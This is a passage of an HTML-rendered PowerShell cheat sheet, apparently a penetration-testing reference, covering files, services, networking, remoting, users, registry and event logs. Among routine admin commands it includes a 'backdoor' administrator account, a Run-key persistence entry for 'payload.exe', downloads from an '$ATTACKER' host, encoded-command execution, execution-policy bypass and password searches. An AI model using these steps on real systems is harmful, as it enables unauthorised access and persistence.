+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ChildItem</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Hidden</span>         <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># show hidden files
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">File operations
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Copy-Item</span> file.txt C:\Temp\
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Move-Item</span> file.txt C:\Temp\file_moved.txt
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Remove-Item</span> file.txt
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Remove-Item</span> C:\Temp\ <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Recurse</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Force</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-Item</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ItemType</span> Directory <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Path</span> C:\Temp\NewFolder
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-Item</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ItemType</span> File <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Path</span> C:\Temp\new.txt
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Read / write files
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Content</span> C:\file.txt
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Set-Content</span> C:\file.txt <span style="color: var(--clr-string); background-color: var(--bg-string);">"content"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Add-Content</span> C:\file.txt <span style="color: var(--clr-string); background-color: var(--bg-string);">"append this"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Content</span> C:\file.txt | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Select-String</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"password"</span>  <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># grep equivalent</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org8c529c8" class="outline-2">
+<h2 id="org8c529c8">Process and Service Management</h2>
+<div class="outline-text-2" id="text-org8c529c8">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_75e6f3de3cd3462ba5f0acddb931e093>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_75e6f3de3cd3462ba5f0acddb931e093=document.querySelector('button[name=btn_75e6f3de3cd3462ba5f0acddb931e093]');
+copyBtnbtn_75e6f3de3cd3462ba5f0acddb931e093.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Processes\nGet-Process\nGet-Process -Name \"explorer\"\nStop-Process -Name \"notepad\" -Force\nStart-Process \"notepad.exe\"\nStart-Process cmd.exe -Verb RunAs   # run as admin\n\n# Services\nGet-Service\nGet-Service -Name \"wuauserv\"\nStart-Service -Name \"wuauserv\"\nStop-Service -Name \"wuauserv\"\nSet-Service -Name \"wuauserv\" -StartupType Disabled\n`);copyBtnbtn_75e6f3de3cd3462ba5f0acddb931e093.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_75e6f3de3cd3462ba5f0acddb931e093.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Processes
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"explorer"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Stop-Process</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"notepad"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Force</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Start-Process</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"notepad.exe"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Start-Process</span> cmd.exe <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Verb</span> RunAs   <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># run as admin
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Services
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Service</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Service</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"wuauserv"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Start-Service</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"wuauserv"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Stop-Service</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"wuauserv"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Set-Service</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"wuauserv"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-StartupType</span> Disabled
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org4be024d" class="outline-2">
+<h2 id="org4be024d">Networking</h2>
+<div class="outline-text-2" id="text-org4be024d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_ae5a97b3225e4c37b5fcc6bccd5a479c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ae5a97b3225e4c37b5fcc6bccd5a479c=document.querySelector('button[name=btn_ae5a97b3225e4c37b5fcc6bccd5a479c]');
+copyBtnbtn_ae5a97b3225e4c37b5fcc6bccd5a479c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Network configuration\nGet-NetIPAddress\nGet-NetAdapter\nTest-NetConnection google.com -Port 443    # test connectivity + port\n\n# DNS\nResolve-DnsName google.com\nResolve-DnsName -Type MX google.com\n\n# Active connections (netstat equivalent)\nGet-NetTCPConnection\nGet-NetTCPConnection -State Established\nGet-NetTCPConnection -LocalPort 443\n\n# Firewall\nGet-NetFirewallRule | Where-Object {$_.Enabled -eq \"True\"}\nNew-NetFirewallRule -DisplayName \"Allow 8080\" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow\n`);copyBtnbtn_ae5a97b3225e4c37b5fcc6bccd5a479c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ae5a97b3225e4c37b5fcc6bccd5a479c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Network configuration
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-NetIPAddress</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-NetAdapter</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Test-NetConnection</span> google.com <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Port</span> 443    <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># test connectivity + port
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">DNS
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Resolve-DnsName</span> google.com
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Resolve-DnsName</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Type</span> MX google.com
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Active connections (netstat equivalent)
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-NetTCPConnection</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-NetTCPConnection</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-State</span> Established
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-NetTCPConnection</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-LocalPort</span> 443
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Firewall
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-NetFirewallRule</span> | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Where-Object</span> {<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">$_</span>.Enabled <span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">-eq</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"True"</span>}
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-NetFirewallRule</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-DisplayName</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Allow 8080"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Direction</span> Inbound <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Port</span> 8080 <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Protocol</span> TCP <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Action</span> Allow
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org74c55c8" class="outline-2">
+<h2 id="org74c55c8">Remote Management</h2>
+<div class="outline-text-2" id="text-org74c55c8">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_b6646675d4844809944648555f4157e0>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b6646675d4844809944648555f4157e0=document.querySelector('button[name=btn_b6646675d4844809944648555f4157e0]');
+copyBtnbtn_b6646675d4844809944648555f4157e0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# WinRM must be enabled on target: Enable-PSRemoting\n# Run commands on remote machine\nInvoke-Command -ComputerName $TARGET -ScriptBlock { Get-Process }\n\n# Interactive remote session\nEnter-PSSession -ComputerName $TARGET\nEnter-PSSession -ComputerName $TARGET -Credential (Get-Credential)\nExit-PSSession\n\n# Pass credentials without prompt\n$cred = New-Object System.Management.Automation.PSCredential(\"user\", (ConvertTo-SecureString \"pass\" -AsPlainText -Force))\nEnter-PSSession -ComputerName $TARGET -Credential $cred\n`);copyBtnbtn_b6646675d4844809944648555f4157e0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b6646675d4844809944648555f4157e0.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">WinRM must be enabled on target: Enable-PSRemoting
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Run commands on remote machine
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Invoke-Command</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ComputerName</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">$TARGET</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ScriptBlock</span> { <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span> }
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Interactive remote session
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Enter-PSSession</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ComputerName</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">$TARGET</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Enter-PSSession</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ComputerName</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">$TARGET</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Credential</span> (<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Credential</span>)
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Exit-PSSession</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Pass credentials without prompt
+</span><span style="color: var(--clr-variable); background-color: var(--bg-variable);">$cred</span> = <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-Object</span> System.Management.Automation.PSCredential(<span style="color: var(--clr-string); background-color: var(--bg-string);">"user"</span>, (<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">ConvertTo-SecureString</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"pass"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-AsPlainText</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Force</span>))
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Enter-PSSession</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ComputerName</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">$TARGET</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Credential</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">$cred</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org6d4f1e6" class="outline-2">
+<h2 id="org6d4f1e6">User and Group Management</h2>
+<div class="outline-text-2" id="text-org6d4f1e6">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_c861bae053644a75adae4cb99440277f>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_c861bae053644a75adae4cb99440277f=document.querySelector('button[name=btn_c861bae053644a75adae4cb99440277f]');
+copyBtnbtn_c861bae053644a75adae4cb99440277f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Local users\nGet-LocalUser\nNew-LocalUser -Name \"backdoor\" -Password (ConvertTo-SecureString \"Pass123!\" -AsPlainText -Force)\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"backdoor\"\nRemove-LocalUser -Name \"backdoor\"\n\n# Domain (Active Directory module)\nGet-ADUser -Filter * | Select-Object Name, SamAccountName\nGet-ADGroupMember -Identity \"Domain Admins\"\nGet-ADComputer -Filter *\n`);copyBtnbtn_c861bae053644a75adae4cb99440277f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c861bae053644a75adae4cb99440277f.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Local users
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-LocalUser</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-LocalUser</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"backdoor"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Password</span> (<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">ConvertTo-SecureString</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Pass123!"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-AsPlainText</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Force</span>)
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Add-LocalGroupMember</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Group</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Administrators"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Member</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"backdoor"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Remove-LocalUser</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"backdoor"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Domain (Active Directory module)
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ADUser</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Filter</span> * | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Select-Object</span> Name, SamAccountName
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ADGroupMember</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Identity</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Domain Admins"</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ADComputer</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Filter</span> *
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgea032a8" class="outline-2">
+<h2 id="orgea032a8">Registry</h2>
+<div class="outline-text-2" id="text-orgea032a8">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_d250ec26f29e4d85a400892d61c966d0>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_d250ec26f29e4d85a400892d61c966d0=document.querySelector('button[name=btn_d250ec26f29e4d85a400892d61c966d0]');
+copyBtnbtn_d250ec26f29e4d85a400892d61c966d0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Navigate registry like a filesystem\nSet-Location HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ChildItem HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# Read a value\nGet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Write a value (persistence)\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \`\n  -Name \"Updater\" -Value \"C:\\Temp\\payload.exe\"\n\n# Delete a value\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \`\n  -Name \"Updater\"\n`);copyBtnbtn_d250ec26f29e4d85a400892d61c966d0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d250ec26f29e4d85a400892d61c966d0.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Navigate registry like a filesystem
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Set-Location</span> HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ChildItem</span> HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Read a value
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ItemProperty</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Path</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Write a value (persistence)
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Set-ItemProperty</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Path</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span> `
+  <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Updater"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Value</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Temp\payload.exe"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Delete a value
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Remove-ItemProperty</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Path</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span> `
+  <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Updater"</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org829a4bf" class="outline-2">
+<h2 id="org829a4bf">Useful One-Liners</h2>
+<div class="outline-text-2" id="text-org829a4bf">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_f0e3e35e5a4241809a8e68370b1cc7e3>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f0e3e35e5a4241809a8e68370b1cc7e3=document.querySelector('button[name=btn_f0e3e35e5a4241809a8e68370b1cc7e3]');
+copyBtnbtn_f0e3e35e5a4241809a8e68370b1cc7e3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Find files containing a string (recursive)\nGet-ChildItem -Recurse | Select-String \"password\" | Select-Object Path, Line\n\n# Download a file\nInvoke-WebRequest -Uri \"http://$ATTACKER/file.exe\" -OutFile \"C:\\Temp\\file.exe\"\n(New-Object Net.WebClient).DownloadFile(\"http://$ATTACKER/file.exe\",\"C:\\Temp\\file.exe\")\n\n# Base64 encode/decode (useful for payload delivery)\n[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"whoami\"))\n[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"dwBoAG8AYQBtAGkA\"))\n\n# Execute base64-encoded command (common in offensive tooling)\npowershell -EncodedCommand <base64>\n\n# Check execution policy\nGet-ExecutionPolicy\nSet-ExecutionPolicy Bypass -Scope Process -Force   # bypass for current session\n\n# Bypass execution policy without changing it\npowershell -ExecutionPolicy Bypass -File script.ps1\n\n# Get system info\nGet-ComputerInfo\n[System.Environment]::OSVersion\n`);copyBtnbtn_f0e3e35e5a4241809a8e68370b1cc7e3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f0e3e35e5a4241809a8e68370b1cc7e3.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Find files containing a string (recursive)
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ChildItem</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Recurse</span> | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Select-String</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"password"</span> | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Select-Object</span> Path, Line
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Download a file
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Invoke-WebRequest</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Uri</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://$ATTACKER/file.exe"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-OutFile</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Temp\file.exe"</span>
+(<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-Object</span> Net.WebClient).DownloadFile(<span style="color: var(--clr-string); background-color: var(--bg-string);">"http://$ATTACKER/file.exe"</span>,<span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Temp\file.exe"</span>)
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Base64 encode/decode (useful for payload delivery)
+</span><span style="color: #11c777;">[Convert]</span>::ToBase64String(<span style="color: #11c777;">[System.Text.Encoding]</span>::Unicode.GetBytes(<span style="color: var(--clr-string); background-color: var(--bg-string);">"whoami"</span>))
+<span style="color: #11c777;">[System.Text.Encoding]</span>::Unicode.GetString(<span style="color: #11c777;">[Convert]</span>::FromBase64String(<span style="color: var(--clr-string); background-color: var(--bg-string);">"dwBoAG8AYQBtAGkA"</span>))
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Execute base64-encoded command (common in offensive tooling)
+</span>powershell <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-EncodedCommand</span> &lt;base64&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Check execution policy
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ExecutionPolicy</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Set-ExecutionPolicy</span> Bypass <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Scope</span> <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">Process</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Force</span>   <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># bypass for current session
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Bypass execution policy without changing it
+</span>powershell <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-ExecutionPolicy</span> Bypass <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-File</span> script.ps1
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Get system info
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ComputerInfo</span>
+<span style="color: #11c777;">[System.Environment]</span>::OSVersion
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orga545f1e" class="outline-2">
+<h2 id="orga545f1e">Event Log Queries</h2>
+<div class="outline-text-2" id="text-orga545f1e">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_12462837ff8a41e1885f156d19c5685f>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_12462837ff8a41e1885f156d19c5685f=document.querySelector('button[name=btn_12462837ff8a41e1885f156d19c5685f]');
+copyBtnbtn_12462837ff8a41e1885f156d19c5685f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Query event logs\nGet-EventLog -LogName Security -Newest 50\nGet-EventLog -LogName Security -InstanceId 4624   # successful logons\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100\n\n# Filter by time\nGet-EventLog -LogName System -After (Get-Date).AddHours(-24)\n`);copyBtnbtn_12462837ff8a41e1885f156d19c5685f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_12462837ff8a41e1885f156d19c5685f.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Query event logs
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-EventLog</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-LogName</span> Security <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Newest</span> 50
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-EventLog</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-LogName</span> Security <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-InstanceId</span> 4624   <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># successful logons
